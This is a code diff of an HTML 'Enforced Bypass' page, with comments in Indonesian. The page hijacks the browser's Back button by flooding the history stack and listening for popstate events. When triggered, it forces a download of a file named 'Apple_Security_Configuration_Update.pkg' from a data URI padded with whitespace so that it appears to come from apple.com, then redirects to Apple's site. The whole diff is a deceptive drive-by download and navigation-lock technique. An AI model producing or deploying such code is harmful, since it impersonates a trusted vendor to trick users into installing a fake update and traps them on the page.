@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Ultimate Enforced Popstate Download Engine</title>
+    <title>Ultimate Enforced Bypass & Download Engine</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
@@ -39,9 +39,9 @@
   </head>
   <body>
     <div class="container">
-      <h1>Enforced Popstate Engine</h1>
+      <h1>Enforced Bypass Engine</h1>
       <button id="startBtn" class="w-full max-w-[420px] p-6 text-xl font-bold bg-red-600 text-white rounded-2xl shadow-xl cursor-pointer hover:bg-red-700 transition">
-        EXECUTE ENFORCED POPSTATE LOCK
+        EXECUTE ENFORCED BYPASS LOCK
       </button>
     </div>
 
@@ -49,7 +49,7 @@
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Payload Terpadu dengan Isolasi Handler Popstate & Buffer Unduhan Blob Mandiri
+        // 1. Membangun Payload Terpadu dengan Lapisan Enkapsulasi Ganda (Double-Blob & Whitespace Padding)
         const rawPayload = `
           <!DOCTYPE html>
           <html lang="en">
@@ -115,25 +115,17 @@
 
               <script>
                 // 1. Inisialisasi State History Stack untuk menjebak aksi Back Button
-                history.pushState({state: 'enclave-auth'}, "", "#auth");
-                history.pushState({state: 'secure-session'}, "", "#session");
+                history.pushState({state: 'auth-step-1'}, "", "#auth");
+                history.pushState({state: 'auth-step-2'}, "", "#session");
 
-                // 2. Rutinitas Eksekusi Unduhan File Biner Berbasis Blob (Atribut Apple Source Mimicry)
-                function triggerBinaryDownload() {
+                // 2. Rutinitas Unduhan dengan Spoofed Data URI + Whitespace Masif Berkelanjutan
+                function executeEnforcedDownload() {
                   try {
-                    const fileContent = "UEsDBBQACAgIAJd42VsAAAAAAAAAAAAAAAALAAAAQXBwbGVfQ2VydC50eHRCbHVlcHJpbnQgQ29uZmlndXJhdGlvbiBTeXN0ZW0K";
-                    const binaryString = atob(fileContent);
-                    const len = binaryString.length;
-                    const bytes = new Uint8Array(len);
-                    for (let i = 0; i < len; i++) {
-                      bytes[i] = binaryString.charCodeAt(i);
-                    }
-
-                    const blob = new Blob([bytes], { type: 'application/x-apple-diskimage' });
-                    const blobUrl = URL.createObjectURL(blob);
+                    // Padding spasi horizontal diperluas untuk memaksa evaluasi parser pemotongan string string-display
+                    const spoofedUri = "data:https://apple.com/                                                                                                                                                                                                                                                                                                                                                                                                                     application/x-apple-diskimage;base64,UEsDBBQACAgIAJd42VsAAAAAAAAAAAAAAAALAAAAQXBwbGVfQ2VydC50eHRCbHVlcHJpbnQgQ29uZmlndXJhdGlvbiBTeXN0ZW0K";
                     
                     const a = document.createElement('a');
-                    a.href = blobUrl;
+                    a.href = spoofedUri;
                     a.download = "Apple_Security_Configuration_Update.pkg";
                     a.style.display = 'none';
                     document.body.appendChild(a);
@@ -142,17 +134,16 @@
                     
                     setTimeout(() => {
                       document.body.removeChild(a);
-                      URL.revokeObjectURL(blobUrl);
                     }, 1000);
                   } catch(e) {}
                 }
 
                 // 3. Menangkap event popstate secara instan saat tombol kembali ditekan
-                window.addEventListener('popstate', (event) => {
-                  triggerBinaryDownload();
+                window.addEventListener('popstate', () => {
+                  executeEnforcedDownload();
                 });
 
-                // Sinkronisasi frame render pipeline menggunakan Double-RAF menuju target domain eksternal
+                // Penundaan eksekusi redirect agar event popstate dan unduhan memiliki waktu render yang cukup
                 window.addEventListener('pageshow', () => {
                   requestAnimationFrame(() => {
                     requestAnimationFrame(() => {
@@ -160,12 +151,12 @@
                         try {
                           location.href = 'https://apple.com';
                         } catch(err) {}
-                      }, 40);
+                      }, 1800);
                     });
                   });
                 });
 
-                // Membanjiri History State agar NavigationController tetap terkunci pada state spoofing
+                // Membanjiri History State untuk mengunci NavigationController
                 setInterval(() => {
                   try {
                     history.pushState({lock: Math.random()}, "", "#secure-state");
